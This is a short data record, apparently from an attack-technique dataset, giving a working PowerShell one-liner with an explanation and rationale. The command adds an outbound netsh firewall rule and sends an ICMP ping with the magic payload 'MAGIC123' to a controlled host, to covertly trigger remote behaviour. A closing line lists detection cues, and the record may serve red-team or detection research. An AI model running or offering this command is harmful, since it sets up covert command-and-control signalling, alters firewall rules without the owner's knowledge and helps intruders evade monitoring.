command: $buf=[Text.Encoding]::ASCII.GetBytes('MAGIC123');& netsh advfirewall firewall add rule name='ICMP-Signal-Out' dir=out action=allow protocol=icmpv4:8,any remoteip=192.0.2.10 >$null;(New-Object System.Net.NetworkInformation.Ping).Send('192.0.2.10',4000,$buf,(New-Object System.Net.NetworkInformation.PingOptions(64,$false)))|Out-Null
explanation: Sends an ICMP Echo Request to 192.0.2.10 with a magic payload 'MAGIC123' to covertly trigger remote behavior. Ensures the ICMP Echo is allowed outbound with a netsh firewall rule. Administrator privileges may be needed if outbound ICMP is restricted.
rationale_steps: Create a specific ICMP Echo payload that serves as a signaling token.
Allow and transmit ICMP Echo to a controlled host using Ping from PowerShell.
Detection: inspect ICMP payloads for fixed strings, monitor netsh changes permitting ICMP, and alert on frequent or irregular pings to external IPs.
